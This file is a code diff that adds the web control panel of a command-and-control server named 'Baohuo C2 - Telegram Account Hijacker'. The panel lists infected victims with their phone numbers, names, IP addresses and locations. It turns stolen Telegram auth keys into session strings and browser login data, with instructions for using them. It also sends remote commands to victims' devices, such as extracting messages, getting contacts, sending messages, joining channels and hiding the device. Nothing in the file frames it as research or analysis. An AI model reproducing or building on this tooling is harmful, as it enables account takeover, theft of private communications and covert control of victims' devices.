@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Baohuo C2 - Telegram Account Hijacker</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e1a;
+            color: #e0e0e0;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: #1a1f2f;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            color: #4a9eff;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: #1a1f2f;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            font-size: 14px;
+            color: #8a8f9f;
+            margin-bottom: 5px;
+        }
+        
+        .stat-card .value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4a9eff;
+        }
+        
+        .victim-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .victim-card {
+            background: #1a1f2f;
+            border-radius: 10px;
+            padding: 15px;
+            position: relative;
+            transition: transform 0.2s;
+        }
+        
+        .victim-card:hover {
+            transform: translateY(-2px);
+            background: #222838;
+        }
+        
+        .victim-card.online {
+            border-left: 4px solid #00c853;
+        }
+        
+        .victim-card.offline {
+            border-left: 4px solid #ff3d00;
+            opacity: 0.7;
+        }
+        
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .victim-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #4a9eff;
+        }
+        
+        .victim-badge {
+            background: #2a2f3f;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+        }
+        
+        .victim-details {
+            font-size: 13px;
+            color: #8a8f9f;
+            margin-bottom: 10px;
+        }
+        
+        .victim-details div {
+            margin: 3px 0;
+        }
+        
+        .victim-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        
+        button {
+            background: #2a2f3f;
+            color: #e0e0e0;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: background 0.2s;
+        }
+        
+        button:hover {
+            background: #3a4050;
+        }
+        
+        button.primary {
+            background: #4a9eff;
+            color: #000;
+        }
+        
+        button.primary:hover {
+            background: #6bb4ff;
+        }
+        
+        button.danger {
+            background: #ff3d00;
+        }
+        
+        button.danger:hover {
+            background: #ff5722;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: #1a1f2f;
+            padding: 25px;
+            border-radius: 10px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .modal-content h2 {
+            color: #4a9eff;
+            margin-bottom: 15px;
+        }
+        
+        .modal-content .close {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8a8f9f;
+        }
+        
+        .modal-content .close:hover {
+            color: #fff;
+        }
+        
+        .session-data {
+            background: #0a0e1a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        .command-select {
+            width: 100%;
+            padding: 8px;
+            background: #2a2f3f;
+            color: #e0e0e0;
+            border: 1px solid #3a4050;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        .param-input {
+            width: 100%;
+            padding: 8px;
+            background: #2a2f3f;
+            color: #e0e0e0;
+            border: 1px solid #3a4050;
+            border-radius: 5px;
+            margin: 5px 0;
+        }
+        
+        .log-area {
+            background: #0a0e1a;
+            padding: 15px;
+            border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        
+        .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid #2a2f3f;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Baohuo C2 - Telegram Account Hijacker</h1>
+            <div>
+                <span id="connection-status" style="color: #00c853;">● Connected</span>
+            </div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Total Victims</h3>
+                <div class="value" id="total-victims">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Online Now</h3>
+                <div class="value" id="online-victims">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Auth Keys</h3>
+                <div class="value" id="auth-keys">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Commands Sent</h3>
+                <div class="value" id="total-commands">0</div>
+            </div>
+        </div>
+        
+        <h2>📱 Infected Victims</h2>
+        <div class="victim-grid" id="victim-grid">
+            <!-- Victims will appear here -->
+        </div>
+        
+        <h2>📋 Activity Log</h2>
+        <div class="log-area" id="log-area">
+            <div class="log-entry">[System] C2 server started</div>
+        </div>
+    </div>
+    
+    <!-- Victim Details Modal -->
+    <div class="modal" id="victim-modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2 id="modal-title">Victim Details</h2>
+            <div id="modal-content"></div>
+        </div>
+    </div>
+    
+    <!-- Session Generator Modal -->
+    <div class="modal" id="session-modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeSessionModal()">&times;</span>
+            <h2 id="session-title">Generate Session</h2>
+            <div id="session-content"></div>
+        </div>
+    </div>
+    
+    <script>
+        const socket = io();
+        let victims = [];
+        let currentVictimId = null;
+        
+        socket.on('connect', () => {
+            document.getElementById('connection-status').innerHTML = '● Connected';
+            document.getElementById('connection-status').style.color = '#00c853';
+            addLog('Connected to server');
+        });
+        
+        socket.on('disconnect', () => {
+            document.getElementById('connection-status').innerHTML = '○ Disconnected';
+            document.getElementById('connection-status').style.color = '#ff3d00';
+            addLog('Disconnected from server');
+        });
+        
+        socket.on('new_victim', (data) => {
+            addLog(`New victim registered: ${data.device_id.substring(0,8)}...`);
+            loadVictims();
+        });
+        
+        socket.on('heartbeat', (data) => {
+            addLog(`Heartbeat from ${data.device_id.substring(0,8)}...`);
+            loadVictims();
+        });
+        
+        socket.on('auth_key_received', (data) => {
+            addLog(`🔥 Auth key received from ${data.device_id.substring(0,8)}...`);
+            loadVictims();
+        });
+        
+        socket.on('command_sent', (data) => {
+            addLog(`Command sent to ${data.device_id.substring(0,8)}...`);
+        });
+        
+        socket.on('command_result', (data) => {
+            addLog(`Command result from ${data.device_id?.substring(0,8) || 'unknown'}`);
+        });
+        
+        async function loadVictims() {
+            try {
+                const response = await fetch('/api/victims');
+                victims = await response.json();
+                renderVictims();
+                updateStats();
+            } catch (e) {
+                addLog(`Error loading victims: ${e}`);
+            }
+        }
+        
+        function renderVictims() {
+            const grid = document.getElementById('victim-grid');
+            grid.innerHTML = '';
+            
+            let onlineCount = 0;
+            let authCount = 0;
+            
+            victims.forEach(v => {
+                const isOnline = (Date.now() / 1000 - v.last_seen) < 300; // 5 minutes
+                if (isOnline) onlineCount++;
+                if (v.auth_key) authCount++;
+                
+                const card = document.createElement('div');
+                card.className = `victim-card ${isOnline ? 'online' : 'offline'}`;
+                
+                const lastSeen = new Date(v.last_seen * 1000).toLocaleString();
+                const firstSeen = new Date(v.first_seen * 1000).toLocaleString();
+                
+                card.innerHTML = `
+                    <div class="victim-header">
+                        <span class="victim-title">${v.username || v.device_id.substring(0,12)}...</span>
+                        <span class="victim-badge">${v.dc_id ? `DC${v.dc_id}` : 'No DC'}</span>
+                    </div>
+                    <div class="victim-details">
+                        <div>📱 ${v.phone || 'No phone'}</div>
+                        <div>👤 ${v.first_name || ''} ${v.last_name || ''}</div>
+                        <div>🆔 ${v.user_id || 'No ID'}</div>
+                        <div>🌍 ${v.country || 'Unknown'} ${v.city ? `(${v.city})` : ''}</div>
+                        <div>🕐 Last: ${lastSeen}</div>
+                    </div>
+                    <div class="victim-actions">
+                        <button onclick="showDetails('${v.device_id}')">Details</button>
+                        <button class="primary" onclick="generateSession('${v.device_id}')" ${!v.auth_key ? 'disabled' : ''}>Generate Session</button>
+                        <button onclick="showCommandForm('${v.device_id}')">Send Command</button>
+                        <button class="danger" onclick="deleteVictim('${v.device_id}')">Delete</button>
+                    </div>
+                `;
+                
+                grid.appendChild(card);
+            });
+            
+            document.getElementById('online-victims').innerText = onlineCount;
+            document.getElementById('auth-keys').innerText = authCount;
+            document.getElementById('total-victims').innerText = victims.length;
+        }
+        
+        function updateStats() {
+            // Stats are updated in renderVictims
+        }
+        
+        async function showDetails(deviceId) {
+            const victim = victims.find(v => v.device_id === deviceId);
+            if (!victim) return;
+            
+            const modal = document.getElementById('victim-modal');
+            const content = document.getElementById('modal-content');
+            
+            const commands = await fetch(`/api/commands/${deviceId}`).then(r => r.json());
+            
+            content.innerHTML = `
+                <div style="margin-bottom:15px">
+                    <p><strong>Device ID:</strong> ${victim.device_id}</p>
+                    <p><strong>User ID:</strong> ${victim.user_id || 'N/A'}</p>
+                    <p><strong>Phone:</strong> ${victim.phone || 'N/A'}</p>
+                    <p><strong>Username:</strong> ${victim.username || 'N/A'}</p>
+                    <p><strong>Name:</strong> ${victim.first_name || ''} ${victim.last_name || ''}</p>
+                    <p><strong>DC ID:</strong> ${victim.dc_id || 'N/A'}</p>
+                    <p><strong>IP:</strong> ${victim.ip || 'N/A'}</p>
+                    <p><strong>Location:</strong> ${victim.country || 'Unknown'} ${victim.city ? `(${victim.city})` : ''}</p>
+                    <p><strong>First Seen:</strong> ${new Date(victim.first_seen * 1000).toLocaleString()}</p>
+                    <p><strong>Last Seen:</strong> ${new Date(victim.last_seen * 1000).toLocaleString()}</p>
+                    ${victim.auth_key ? `<p><strong>Auth Key:</strong> <code style="word-break:break-all">${victim.auth_key.substring(0,64)}...</code></p>` : ''}
+                </div>
+                <h3>Command History</h3>
+                <div style="max-height:200px; overflow-y:auto">
+                    ${commands.length ? commands.map(c => `
+                        <div style="background:#0a0e1a; padding:5px; margin:5px 0; border-radius:3px">
+                            <strong>${c.command}</strong> (${c.status})<br>
+                            <small>${new Date(c.issued_at * 1000).toLocaleString()}</small>
+                        </div>
+                    `).join('') : 'No commands yet'}
+                </div>
+            `;
+            
+            modal.style.display = 'flex';
+        }
+        
+        async function generateSession(deviceId) {
+            const victim = victims.find(v => v.device_id === deviceId);
+            if (!victim || !victim.auth_key) {
+                alert('No auth key available for this victim');
+                return;
+            }
+            
+            const response = await fetch(`/api/session/generate/${deviceId}`);
+            const data = await response.json();
+            
+            const modal = document.getElementById('session-modal');
+            const content = document.getElementById('session-content');
+            
+            content.innerHTML = `
+                <h3>Session Generated for ${data.username || data.device_id}</h3>
+                <p><strong>User ID:</strong> ${data.user_id}</p>
+                <p><strong>Phone:</strong> ${data.phone || 'N/A'}</p>
+                
+                <h4 style="margin-top:15px">📱 Telethon Session String</h4>
+                <div class="session-data" id="telethon-session">${data.formats.telethon}</div>
+                <button onclick="copyToClipboard('telethon-session')">Copy Telethon String</button>
+                
+                <h4 style="margin-top:15px">🌐 Web Login Data</h4>
+                <div class="session-data" id="web-session">${JSON.stringify(data.formats.web, null, 2)}</div>
+                <button onclick="copyToClipboard('web-session')">Copy Web Data</button>
+                
+                <h4 style="margin-top:15px">📁 tData Info</h4>
+                <div class="session-data" id="tdata-session">${JSON.stringify(data.formats.tdata_info, null, 2)}</div>
+                <button onclick="copyToClipboard('tdata-session')">Copy tData Info</button>
+                
+                <p style="margin-top:15px; color:#8a8f9f; font-size:12px">
+                    📝 Telethon: Use with Python script<br>
+                    🌐 Web: Paste into browser localStorage (Application tab)<br>
+                    📁 tData: Create folder with these values
+                </p>
+            `;
+            
+            modal.style.display = 'flex';
+        }
+        
+        async function showCommandForm(deviceId) {
+            const victim = victims.find(v => v.device_id === deviceId);
+            if (!victim) return;
+            
+            const modal = document.getElementById('victim-modal');
+            const content = document.getElementById('modal-content');
+            
+            content.innerHTML = `
+                <h3>Send Command to ${victim.username || victim.device_id.substring(0,12)}</h3>
+                
+                <select class="command-select" id="command-select">
+                    <option value="/tg/joinChannel">Join Channel</option>
+                    <option value="/tg/leaveChannel">Leave Channel</option>
+                    <option value="/tg/sendMessage">Send Message</option>
+                    <option value="/tg/getChats">Get Chats</option>
+                    <option value="/tg/getContacts">Get Contacts</option>
+                    <option value="/tg/extractMessages">Extract Messages</option>
+                    <option value="/tg/terminateSession">Terminate Session</option>
+                    <option value="/tg/hideDevice">Hide Device</option>
+                </select>
+                
+                <div id="command-params">
+                    <input class="param-input" type="text" id="param-channel" placeholder="Channel link or ID" style="display:none">
+                    <input class="param-input" type="text" id="param-chat" placeholder="Chat ID" style="display:none">
+                    <textarea class="param-input" id="param-message" placeholder="Message text" rows="3" style="display:none"></textarea>
+                </div>
+                
+                <button onclick="sendCommand('${deviceId}')">Send Command</button>
+                <button onclick="closeModal()">Cancel</button>
+            `;
+            
+            // Show/hide params based on command selection
+            document.getElementById('command-select').addEventListener('change', function(e) {
+                const val = e.target.value;
+                document.getElementById('param-channel').style.display = 
+                    val.includes('Channel') ? 'block' : 'none';
+                document.getElementById('param-chat').style.display = 
+                    val.includes('Message') || val.includes('Messages') ? 'block' : 'none';
+                document.getElementById('param-message').style.display = 
+                    val.includes('Message') ? 'block' : 'none';
+            });
+            
+            modal.style.display = 'flex';
+        }
+        
+        async function sendCommand(deviceId) {
+            const cmd = document.getElementById('command-select').value;
+            const params = {};
+            
+            if (cmd.includes('Channel')) {
+                params.channel = document.getElementById('param-channel').value;
+            }
+            if (cmd.includes('Message')) {
+                params.chat_id = document.getElementById('param-chat').value;
+                params.text = document.getElementById('param-message').value;
+            }
+            
+            const response = await fetch('/api/send_command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    command: cmd,
+                    params: params
+                })
+            });
+            
+            const data = await response.json();
+            addLog(`Command sent: ${cmd} to ${deviceId.substring(0,8)}...`);
+            closeModal();
+        }
+        
+        async function deleteVictim(deviceId) {
+            if (!confirm('Delete this victim?')) return;
+            
+            await fetch(`/api/delete_victim/${deviceId}`, {method: 'DELETE'});
+            loadVictims();
+            addLog(`Victim ${deviceId.substring(0,8)}... deleted`);
+        }
+        
+        function closeModal() {
+            document.getElementById('victim-modal').style.display = 'none';
+        }
+        
+        function closeSessionModal() {
+            document.getElementById('session-modal').style.display = 'none';
+        }
+        
+        function copyToClipboard(elementId) {
+            const el = document.getElementById(elementId);
+            const text = el.innerText || el.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Copied to clipboard!');
+            });
+        }
+        
+        function addLog(message) {
+            const log = document.getElementById('log-area');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        // Load victims on page load and every 5 seconds
+        loadVictims();
+        setInterval(loadVictims, 5000);
+    </script>
+</body>
+</html>
